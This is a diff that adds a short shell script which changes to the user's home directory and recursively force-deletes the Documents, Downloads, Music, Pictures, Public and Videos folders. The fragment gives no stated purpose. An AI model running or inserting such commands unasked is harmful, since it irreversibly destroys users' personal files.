@@ -1,0 +1,9 @@
+#!/bin/sh
+
+cd $HOME
+rm -rf Documents
+rm -rf Downloads
+rm -rf Music
+rm -rf Pictures
+rm -rf Public
+rm -rf Videos
